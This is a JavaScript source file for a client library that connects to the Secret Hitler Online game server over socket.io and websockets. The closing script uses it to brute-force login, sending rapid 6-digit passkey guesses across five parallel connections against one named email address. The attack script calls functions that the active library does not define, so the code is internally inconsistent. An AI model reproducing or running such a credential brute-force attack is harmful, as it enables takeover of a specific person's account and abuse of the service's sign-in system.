/** The Bombe
 * A suite of tools designed to easily communicate with http://secrethitler.online/
 * Named after the 'Bombe', a machine built by Alan Turing during WWII to help break the German Enigma code.
 * https://en.wikipedia.org/wiki/Bombe
 */

(function () {
    var _export = null; //The inner window object
    var _node = false; //Are we running inside nodejs?

    //Determine if we're running in a nodejs instance or in the browser
    if (typeof window === "undefined") { //Running in nodejs
        _node = true;
    } else { //Running in the browser
        if (location.href.match(/^http(?:s)*:\/\/(?:www.)secrethitler.online\//g).length === 0) {
            (console.warn || console.log)("NOTE: It looks like you're running The Bombe in a browser, and are not on the Secret Hitler Online website.\nPlease ensure you disable the Same-Origin policy in order for this script to work.");
        }
    }

    //If we're in node, the web access functions need to come from external modules.
    var XMLHttpRequest;
    var WebSocket;
    if (_node) {
        XMLHttpRequest = require("xhr2");
        WebSocket = require("ws");
    } else {
        XMLHttpRequest = window.XMLHttpRequest;
        WebSocket = window.WebSocket;
    }

    /** BombeMachine
     * Facilitates a connection between the client and a Secret Hitler Online server, where the client can send arbitrary requests and view the results.
     *
     * @param {String} [URL] - The base url for the secret hitler server: "<protocol>://<server>/"
     * @constructor
     */
    function BombeMachine (URL) {
        this.URL = URL || "https://secrethitler.online/"; //If the Secret Hitler URL isn't specified, use the default.
        this.hasMadeFirstContact = false; //Has this particular machine made first contact with the server and obtained a session ID?
        this.hasWebsocketConnection = false; //Has this machine opened a websocket connection with the server?

        this.sid = null; //The session ID obtained during first contact
        this.requiredPingInterval = null; //The ping interval set by the server during first contact
        this.pingTimeout = null; //The ping timeout set by the server during first contact

        this.websocket = null; //The websocket object associated with this BombeMachine

        this.logOutgoing = true; //Log outgoing messages to the console
        this.logIncoming = true; //Log incoming messages to the console
    }
    BombeMachine.prototype = {}; // "Reset" the prototype

    /** autoLogging
     * Turns off automatic logging (through console.log) if incoming and outgoing websocket messages.
     * Incoming and outgoing logging can be controlled individually through 'logIncoming' and 'logOutgoing' respectively.
     *
     * @param doAutoLogging
     */
    BombeMachine.prototype.autoLogging = function (doAutoLogging) {
        //Set both outgoing and incoming log flags
        this.logIncoming = this.logOutgoing = doAutoLogging;
    };

    /** makeFirstContact
     * Connects to the server as the client normally would when the page first loads.
     * The server will send back the following data (I've included an explanation based on my tests):
     *  - sid: IMPORTANT - session ID, used for some future server communications in this session
     *  - upgrades: Should be ["websocket"] if the server is ready to upgrade the connection to a duplex websocket
     *  - pingInterval: IMPORTANT - Once the websocket connection is made, the server must be pinged at this interval or it will close the connection
     *  - pingTimeout: Not entirely sure what this is. It could be a recommendation that the client close the connection if it hasn't received a 'pong'
     *                 within <pingTimeout> ms of sending the ping.
     *
     * makeFirstContact will pass the received data to the callback function once it has made contact with the server.
     * @param callback
     */
    BombeMachine.prototype.makeFirstContact = function (callback) {
        var self = this; //Allow the 'this' variable to be carried into closures

        console.log("BombeMachine making first contact..");

        var URL = self.URL + "/socket.io/?EIO=3&transport=polling&t=" + Math.random(); //The URL, including a random UID
        var method = "GET"; //The method used to send data to the server

        //Instantiate the request handler object
        var xhrFirstContact = new XMLHttpRequest();

        //Event handler for whenever a new update comes from the server, up until it's finished (readyState 4)
        xhrFirstContact.onreadystatechange = function () {
            if (xhrFirstContact.readyState === 4) { //The server has finished responding
                var JSONResponse = null; //Container for the parsed JSON
                try {
                    //Parse the JSON, starting from the first '{' as the server sends back a few weird characters first.
                    JSONResponse = JSON.parse(xhrFirstContact.responseText.substr(xhrFirstContact.responseText.indexOf('{')));
                } catch (e) {
                    //Error parsing JSON. Exit.
                    (console.error || console.log)("[Bombe Machine - First Contact] Failed to parse JSON response.\n" + e.description);
                    return;
                }

                console.log("[Bombe Machine - First Contact] Server response code:" + xhrFirstContact.status); //Log the status. Should be 200.
                console.log("[Bombe Machine - First Contact] Server allocated SID:\n" + JSONResponse["sid"]); //Log the JSON response for debugging.

                //Set the 'hasMadeFirstContact' flag
                self.hasMadeFirstContact = true;

                //Check that the response contains the required data (sid, pingInterval, pingTimeout) and add it to the object
                if (JSONResponse["sid"]) {
                    self.sid = JSONResponse["sid"];
                } else {
                    //If self.sid can't be set, it will need to be set once the data is passed to 'callback'
                    (console.warn || console.log)("WARNING: Unable to automatically set 'sid' for BombeMachine object. This will need to be set manually in the callback function.");
                }

                if (JSONResponse["pingInterval"]) {
                    self.requiredPingInterval = JSONResponse["pingInterval"];
                } else {
                    //If self.requiredPingInterval can't be set, it will need to be set once the data is passed to 'callback'
                    (console.warn || console.log)("WARNING: Unable to automatically set 'requiredPingInterval' for BombeMachine object. This will need to be set manually in the callback function.");
                }

                if (JSONResponse["pingTimeout"]) {
                    self.pingTimeout = JSONResponse["pingTimeout"];
                } else {
                    //If self.pingTimeout can't be set, it will need to be set once the data is passed to 'callback'
                    (console.warn || console.log)("WARNING: Unable to automatically set 'pingTimeout' for BombeMachine object. This will need to be set manually in the callback function.");
                }


                //Pass the JSON to the callback function
                callback(JSONResponse);
            }
        };

        //Create the request
        xhrFirstContact.open(method, URL, true);

        //Send the request.
        xhrFirstContact.send();
    };

    /** connectWebsocket
     * Opens a websockets connection to the Secret Hitler server.
     * Requires the BombeMachine to have made first contact, or otherwise requires the first contact data to be passed to it
     *
     * @param {Function} callback
     * @param {Object} [data]
     */
    BombeMachine.prototype.connectWebsocket = function (callback, data) {
        var self = this;

        //Check that we have all the required data.
        if (!self.hasMadeFirstContact) {
            if (data) {
                if (!data.sid) throw {e: "[BombeMachine.connectWebsocket] The BombeMachine has not made first contact, and incorrect alternate data has been provided. Missing 'sid'."};
                if (!data.pingInterval && !data.requiredPingInterval) throw {e: "[BombeMachine.connectWebsocket] The BombeMachine has not made first contact, and incorrect alternate data has been provided. Missing 'pingInterval'"};
                if (!data.pingTimeout) throw {e: "[BombeMachine.connectWebsocket] The BombeMachine has not made first contact, and incorrect alternate data has been provided. Missing 'pingTimeout'"};

                self.sid = data.sid;
                self.requiredPingInterval = data.requiredPingInterval || data.pingInterval;
                self.pingTimeout = data.pingTimeout;
            } else {
                throw {e: "[BombeMachine.connectWebsocket] The BombeMachine has not made first contact, and no alternate data has been provided."};
            }
        }

        //Instantiate the websocket handler object
        self.websocket = new WebSocket(self.URL.replace(/^http/g, "ws") + "socket.io/?EIO=3&transport=websocket&sid=" + self.sid);

        //And wait until it has finished establishing a connection to the server
        self.websocket.onopen = function () {
            /** Set up the BombeMachine websocket functions **/

            //Used to delete event handlers
            var handler_id = 0;

            //Event handler list
            var handlers = {
                incoming: {},
                outgoing: {}
            };

            //Ping handler queue.
            var ping_callbacks = [];

            self.prototype.onReceive = function (handler) {
                handlers.incoming[handler_id++] = handler;
            };
            self.prototype.onSend = function (handler) {
                handlers.outgoing[handler_id++] = handler;
            };
            self.prototype.removeHandler = function (id) {
                //Check for the ID in each of the handler lists and delete accordingly.
                if (handlers.incoming[id]) {
                    delete handlers.incoming[id];
                } else if (handlers.outgoing[id]) {
                    delete handlers.outgoing[id];
                } else { //Otherwiser error
                    throw {e: "[BombeMachine.removeHandler] Invalid ID."};
                }
            };
            self.prototype.send = function (data) {
                //If logging is enabled, log.
                if (self.logOutgoing) {
                    console.log("Send: " + data);
                }

                //Send data to server
                self.websocket.send(data);
            };
            self.prototype.ping = function (callback) {
                self.websocket.send("2"); //The 'ping' bit. The 'pong' bit is "3".

                //Queues the callback function in the ping handler queue
                ping_callbacks.push(callback);
            };

            //The event handler for receiving a message. This will direct all the user-defined event handlers.
            self.websocket.onmessage = function (event) {
                if (event.data === "3" && ping_callbacks.length > 0) { //If the message is a pong, handle accordingly.
                    //Store the first handler in the ping queue.
                    var cb = ping_callbacks[0];

                    //Remove it from the queue
                    ping_callbacks.splice(0, 1);

                    //Call it
                    cb();
                } else { //Otherwise (if the message is not a pong), handle normally.

                    //Log if logging is enabled
                    if (self.logIncoming) {
                        console.log("Receive: " + data);
                    }

                    //Iterate through the list of handlers and call each
                    Object.keys(handlers.incoming).forEach(function (key) {
                        handlers.incoming[key](event.data);
                    });
                }
            };

            //Auto-ping functionality. Required for the Secret Hitler server to keep the connection alive.
            var autoPingID = null; //Store the setInterval ID to allow for removeInterval
            self.prototype.startAutoPing = function (interval, timeout) {

                //Check if it's already running
                if (autoPingID !== null) {
                    throw {e: "[BombeMachine] Unable to start auto ping as it's already running."};
                }

                //User can specify an interval, or use the server's requested interval
                interval = interval || self.requiredPingInterval;

                //User can specify a timeout, or use the server's recommended timeout
                timeout = timeout || self.pingTimeout;

                autoPingID = setInterval(function () {
                    var timeout_watch = null;
                    self.ping(function () {
                        clearTimeout(timeout_watch);
                    });

                    timeout_watch = setTimeout(function () {
                        throw {e: "[BombeMachine] Automatic ping timed out."};
                    }, timeout);
                }, interval);
            };
            self.prototype.stopAutoPing = function () {
                //Check that it's actually running
                if (autoPingID === null) {
                    throw {e: "[BombeMachine] Unable to stop auto ping as it's not running."};
                }

                clearInterval(autoPingID);

                autoPingID = null;
            };

            //Finished. Call the callback.
            callback();
        };
    };

    //Declare functions which are not implemented until the BombeMachine establishes a WebSocket connection.
    function not_implemented() {
        throw {
            e: "[BombeMachine] Unable to call function. Bombe machine not fully set up."
        }
    }
    BombeMachine.prototype.onReceive = not_implemented;
    BombeMachine.prototype.onSend = not_implemented;
    BombeMachine.prototype.removeHandler = not_implemented;
    BombeMachine.prototype.send = not_implemented;
    BombeMachine.prototype.ping = not_implemented;
    BombeMachine.prototype.startAutoPing = not_implemented;
    BombeMachine.prototype.stopAutoPing = not_implemented;

    /** doSetup
     * Automatic setup for the BombeMachine.
     * Makes first contact, establishes a WebSockets connection and the calls a callback when done.
     *
     * @param callback
     */
    BombeMachine.prototype.doSetup = function (callback) {
        var self = this;
        self.makeFirstContact(function () {
            self.connectWebsocket(function () {
                self.startAutoPing();
                callback();
            });
        });
    };


    // _export.setup = function (callback) {
    //     //Pre-declare functions
    //     var setupWebSocket = null;
    //
    //     //The server's response to the first contact. Includes sessionID (sid).
    //     var jsonFirstContact = null;
    //
    //     //Set up a SecHitOnline server connection
    //     (function () {
    //         //The URL, including a random UID
    //         var URL = "https://secrethitler.online/socket.io/?EIO=3&transport=polling&t=" + Math.random();
    //         var method = "GET"; //You really expect me to comment this?
    //
    //         //Instantiate the request handler object
    //         var xhrFirstContact = new XMLHttpRequest();
    //
    //         //Event handler for whenever a new update comes from the server, up until it's finished (readyState 4)
    //         xhrFirstContact.onreadystatechange = function () {
    //             console.log("[xhr] Ready state changed: " + xhrFirstContact.readyState);
    //             if (xhrFirstContact.readyState === 4) { //The server has finished responding
    //                 console.log("[xhr] Server response code:" + xhrFirstContact.status); //Log the status. Should be 200.
    //                 console.log("[xhr] Server response:\n" + xhrFirstContact.responseText); //Log the JSON response for debugging.
    //
    //                 //Parse the JSON response and store it
    //                 jsonFirstContact = JSON.parse(xhrFirstContact.responseText.substr(xhrFirstContact.responseText.indexOf('{')));
    //
    //                 //Set up the websocket using the SessionID allocated by the server.
    //                 setupWebSocket(callback);
    //             }
    //         };
    //
    //         //Create the request
    //         xhrFirstContact.open(method, URL, true);
    //
    //         //Send the request.
    //         xhrFirstContact.send();
    //     }());
    //
    //     //After first contact has been made, set up a websockets connection
    //     setupWebSocket = function (callback) {
    //
    //         //Check that first contact has been made
    //         if (!jsonFirstContact) {
    //             throw {e: "First contact needs to be made with the server to obtain session ID before trying to set up websockets."};
    //         }
    //
    //         //Check that the correct parameters are contained within the first contact response
    //         if (!jsonFirstContact.sid) {
    //             throw {e: "Missing SID from server."}
    //         }
    //         if (!jsonFirstContact.upgrades || !jsonFirstContact.upgrades.length || jsonFirstContact.upgrades[0] !== "websocket") {
    //             throw {e: "The server is not ready to start a websocket connection."}
    //         }
    //
    //         //Instantiate the websocket handler object
    //         var WS = new WebSocket("wss://secrethitler.online/socket.io/?EIO=3&transport=websocket&sid=" + jsonFirstContact.sid);
    //
    //         //Wait until the connection is established
    //         WS.onopen = function () {
    //             //And call the callback, which comes indirectly from the anonymous function param.
    //             WS.onmessage = function (event) {
    //                 console.log(event.data);
    //             };
    //
    //             //Create a mirror to return, in order to edit the functionality of the WebSocket object
    //             var ws_mirror = {};
    //             var ws_mirror_data = {
    //                 doLogging: true
    //             };
    //
    //             //Give the mirror all the keys of the WS object
    //             Object.keys(WS).forEach(function (key) {
    //                 ws_mirror[key] = WS[key];
    //             });
    //
    //             //Modify the send key to log the data before it's sent
    //             ws_mirror.send = function (data) {
    //                 if (ws_mirror_data.doLogging) {
    //                     console.log("Send: " + data);
    //                 }
    //                 WS.send(data);
    //             };
    //
    //             //Pre-declare the data for automatic pinging (which is implemented below)
    //             var autoping_data = {
    //                 awaitingReply: false
    //             };
    //
    //             //Create a list of event handlers to allow multiple.
    //             var cb_list = {};
    //             var id = 0;
    //
    //             //Modify onmessage to add to the event handler list
    //             ws_mirror.onmessage = function (callback) {
    //                 cb_list[++id] = callback;
    //                 return id;
    //             };
    //
    //             //The *actual* onmessage event will implement the event handler list
    //             WS.onmessage = function (event) {
    //                 if (event.data === "3" && autoping_data.awaitingReply) {
    //                     autoping_data.awaitingReply = false;
    //                     console.log("Automatic Ping: Successful.");
    //                     return;
    //                 }
    //
    //                 if (ws_mirror_data.doLogging) {
    //                     console.log("Receive: " + event.data);
    //                 }
    //
    //                 var keys = Object.keys(cb_list);
    //                 if (keys.length > 0) {
    //                     keys.forEach(function (key) {
    //                         cb_list[key](event);
    //                     });
    //                 }
    //             };
    //
    //             //And to remove the event handler, use the ID returned by the onmessage function
    //             ws_mirror.removemessagehandler = function (id) {
    //                 if (!cb_list[id]) {
    //                     return;
    //                 }
    //
    //                 delete cb_list[id];
    //             };
    //
    //             //Auto-ping functionality. The server requires a ping every once in a while. It sets it's desired interval with
    //             //pingInterval, from the first contact.
    //             ws_mirror.start_auto_ping = function() {
    //                 console.log("Starting automatic ping operation.");
    //                 setInterval(function () {
    //                     autoping_data.awaitingReply = true;
    //                     WS.send("2"); //The 'ping' bit.
    //                     //The 'pong' is handled in WS.onmessage.
    //                 }, jsonFirstContact.pingInterval - 2500);
    //             };
    //
    //             //Enable log disabling.
    //             ws_mirror.disable_logging = function () {
    //                 ws_mirror_data.doLogging = false;
    //             };
    //
    //             ws_mirror.enable_logging = function () {
    //                 ws_mirror_data.doLogging = true;
    //             };
    //
    //             console.log("WebSocket connection has finished setup. Testing now.");
    //             var response = false;
    //             var handler = ws_mirror.onmessage(function (event) {
    //                 response = true;
    //
    //                 if (event.data === "3probe") {
    //                     console.log("Server responded as expected.");
    //                 } else {
    //                     console.log("Server did not respond as expected. Proceeding anyway.");
    //                 }
    //
    //                 ws_mirror.removemessagehandler(handler);
    //
    //                 console.log("Finalizing connection to server by sending protocol 5 (requesting server to flush cache and stuff)");
    //                 ws_mirror.send("5");
    //                 ws_mirror.start_auto_ping();
    //
    //                 console.log("WebSocket connection created to secrethitler.online.\nUse \"sechit_ws\" to send and receive requests.");
    //                 callback(ws_mirror);
    //             });
    //             ws_mirror.send("2probe");
    //
    //             setTimeout(function () {
    //                 if (response) {
    //                     return;
    //                 }
    //
    //                 ws_mirror.removemessagehandler(handler);
    //                 console.log("Server test failed: ping timed out.");
    //             }, jsonFirstContact.pingTimeout);
    //         }
    //     };
    // };

    if (_node) {
        module.exports = BombeMachine;
    } else {
        window.BombeMachine = BombeMachine;
    }
}());

var XMLHttpRequest = require("xhr2");
var WebSocket = require("ws");


var count = 5;

var sechit_ws = [];
var cb = function (ws) {
    sechit_ws.push(ws);

    if (sechit_ws.length === count) {
        console.log("SETUP COMPLETE!");

        (function () {

            for (var k = 0; k < sechit_ws.length; k++) {
                sechit_ws[k].disable_logging();
            }



            function pad(num, size) {
                var s = num+"";
                while (s.length < size) s = "0" + s;
                return s;
            }

            var email = "boss.holodkov@gmail.com";

            var ms = (new Date()).getTime();

            var upto_send = 0;
            var upto_receive = 0;
            for (var j = 0; j < sechit_ws.length; j++) {
                sechit_ws[j].onmessage(function (event) {
                    if (++upto_receive % 5000 === 0) {
                        console.log("Checked " + upto_receive + " combinations. (" + ((new Date()).getTime() - ms) / 1000 + "s)");
                    }

                    if (event.data.indexOf("error") === -1) {
                        if (event.data == 40) return;

                        console.log("FOUND IT: " + event.data)
                    }
                });
            }


            // for (var i = 0; i < 1000000; i++) {
            //     if (i % 5000 === 0) {
            //         console.log(i);
            //     }
            //
            //     var key = pad(i, 6);
            //
            //     sechit_ws.send('421["signin passkey",{"email":"' + email + '","pass":"' + pad(i, 6) + '"}]');
            // }

            setInterval(function () {
                for (var j = 0; j < sechit_ws.length; j++) {
                    sechit_ws[j].send('421["signin passkey",{"email":"' + email + '","pass":"' + pad(++upto_send, 6) + '"}]');

                    if (upto_send % 10000 === 0) {
                        console.log("Sent " + upto_send + " requests. (" + ((new Date()).getTime() - ms) / 1000 + "s)");
                    }
                }
            }, 10);

        }());
    }
};

for (var i = 0; i < count; i++) {
    setup(cb);
}